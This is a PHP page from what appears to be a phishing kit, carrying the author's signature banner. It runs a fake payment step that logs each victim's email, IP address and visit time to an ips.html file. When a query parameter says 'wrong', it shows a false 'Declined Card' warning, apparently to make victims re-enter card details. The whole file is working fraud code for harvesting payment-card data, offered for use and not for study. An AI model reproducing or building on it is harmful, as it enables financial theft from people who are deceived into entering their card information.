<?php
#####################################################################################################
###################################### fallagmahdi@hotmail.com ######################################
###### ####### ##      ##      #######  #######       #### #### ####### ##    ##   ######   ########
##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##    ##   ##    ##    ##
###### ####### ##      ##      ####### ##  ######     ##  #  ## ####### ########   ##     ##   ##
##     ##   ## ##      ##      ##   ## ##    ##       ##     ## ##   ## ##    ##   ##    ##    ##
##     ##   ## ####### ####### ##   ##  #######       ##     ## ##   ## ##    ##   ######   ########
############################## https://www.facebook.com/fallag.mahdi.tn #############################
#####################################################################################################
session_start();
include("inc/config.php");
$rand = @$_GET['dispatch'];
$email = $_SESSION['email'];
date_default_timezone_set("Africa/Tunis");
$date           = date('d/m/Y', time());
$time           = date('H:i:s', time());
$ip = getenv("REMOTE_ADDR");
$msg = "<b>$email </b> with <b>$ip</b> has cammed to <b>PAYMENT</b> at <b>$time - $date</b><br>";
$myFile = "../ips.html";
$fh = fopen($myFile, 'a+') or die("can't open file");
fwrite($fh, $msg);
fclose($fh);
$css = css_pay();
$js = js_pay();

if(@$_GET['id'] == "wrong") {
	$html = html_pay($css, $js, "<b style='color:red;'>Declined Card ,please check your information !</b>");

} else {
	$html = html_pay($css, $js);

}
die($html);

?>
